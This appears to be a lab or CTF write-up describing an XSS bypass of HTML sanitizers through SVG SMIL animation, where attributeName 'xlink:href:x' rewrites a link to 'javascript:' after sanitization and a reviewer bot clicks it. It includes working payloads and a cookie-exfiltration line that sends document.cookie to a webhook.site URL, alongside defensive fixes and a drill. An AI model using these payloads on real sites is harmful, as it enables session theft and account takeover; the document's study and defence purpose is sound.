# SVG SMIL attributeName xlink:href Sanitizer Bypass

## Date

2026-07-09

## Target Type

Client-side HTML sanitizers that allow SVG and SMIL animation primitives in preview/render flows

## Bug Class

XSS through sanitizer bypass, SVG SMIL post-sanitization mutation, namespace attribute confusion, reviewer-bot cookie theft

## Initial Signal

Look for flows where:

- a sanitizer allows `animate`, `set`, `animateMotion`, or `animateTransform`
- animation elements are dropped only when `attributeName === 'href'` or `attributeName === 'xlink:href'`
- direct `href="javascript:..."` is blocked
- forms may be denied entirely
- a preview or reviewer bot auto-clicks the first link

Common vulnerable check:

```javascript
if (attributeName === 'href' || attributeName === 'xlink:href') {
  drop(animationElement);
}
```

## Pattern

### Stage 1: pass sanitization with a safe link

```html
<svg xmlns:xlink="http://www.w3.org/1999/xlink">
  <a id="foo" xlink:href="https://example.com">
    <text x="20" y="20">click</text>
  </a>
  ...
</svg>
```

### Stage 2: survive attributeName filter

Use namespace-parser confusion:

```text
attributeName="xlink:href:x"
```

The sanitizer sees a value that is not exactly `xlink:href`. Chrome's SVG parser still maps it to `xlink:href`.

### Stage 3: rewrite after sanitization

```html
<set href="#foo" attributeName="xlink:href:x" to="javascript:eval(atob('[BASE64]'))"></set>
```

`<animate href="#foo" attributeName="xlink:href:x" values="javascript:...">` is also viable.

### Stage 4: reviewer activation

If the bot auto-clicks the first `<a>`, no user interaction is required.

For cookie exfil, hide the sink in base64 when Chrome blocks literal `document` / `cookie` substrings in `javascript:` navigation URLs:

```javascript
fetch('https://webhook.site/[UUID]?c='+encodeURIComponent(document.cookie))
```

## Trust Boundaries

| Component | What it sees | Decision |
|---|---|---|
| Sanitizer | `attributeName="xlink:href:x"` | not exactly `xlink:href` -> keep |
| Browser SMIL | parsed `xlink:href` target | rewrite link after sanitization |
| Reviewer bot | first `<a>` in rendered output | auto-click executes rewritten URL |

## Common Mistakes

- Reusing Pillbox's malformed `javascript://://` trick on a prefix-check sanitizer.
- Assuming `attributeName="HREF"` works because it bypasses the string compare; SMIL may not mutate the real attribute.
- Using HTML `<a href>` with `href:x` instead of SVG `xlink:href:x`.
- Putting the payload on a second link when the bot only clicks the first `a`.
- Forgetting that forms may be denied entirely in sibling lab builds.

## Defensive Fix

- Parse `attributeName` with SVG-aware logic, not `===`.
- Deny any animation that resolves to `href` or `xlink:href`, including `xlink:href:x`.
- Scrub `to`, `from`, and `values` on animation elements for `javascript:`.
- Do not auto-activate sanitized links in privileged review contexts.

## Related Labs

- Hairline: SMIL `xlink:href:x` plus auto-link click
- Pillbox: malformed `javascript:` on allowed `<form action>` plus auto-submit
- COLLIDE: DOM clobbering on denied `<form>` plus autofocus

## Drill

Given:

```javascript
function safeAttributeName(v) {
  return v !== 'href' && v !== 'xlink:href';
}
```

Ask:

1. Does `safeAttributeName('xlink:href:x')` return true or false?
2. What navigation attribute does Chrome SMIL mutate?
3. Why is this bypass different from Pillbox's URL reparsing trick?

## Checklist Update

When a sanitizer allows SVG animation tags, test `attributeName` variants for `href`, `xlink:href`, `xlink:href:x`, case changes, and surrounding whitespace on every build that auto-activates links or forms.
